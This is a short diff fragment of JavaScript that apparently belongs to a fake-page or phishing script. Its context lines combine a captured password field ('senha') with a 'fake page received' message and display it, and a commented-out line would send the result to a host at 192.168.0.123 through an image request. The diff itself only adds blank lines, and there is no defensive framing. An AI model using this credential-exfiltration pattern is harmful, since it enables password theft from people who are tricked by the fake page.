@@ -16,4 +16,6 @@ retorno = array.senha +'&|&'+ str2 + 'Recebeu_uma_PAGINA_FALSA_aguarde...';
 alert(retorno);
 
 
+
+
 //new Image().src = "http://192.168.0.123/?=" + retorno
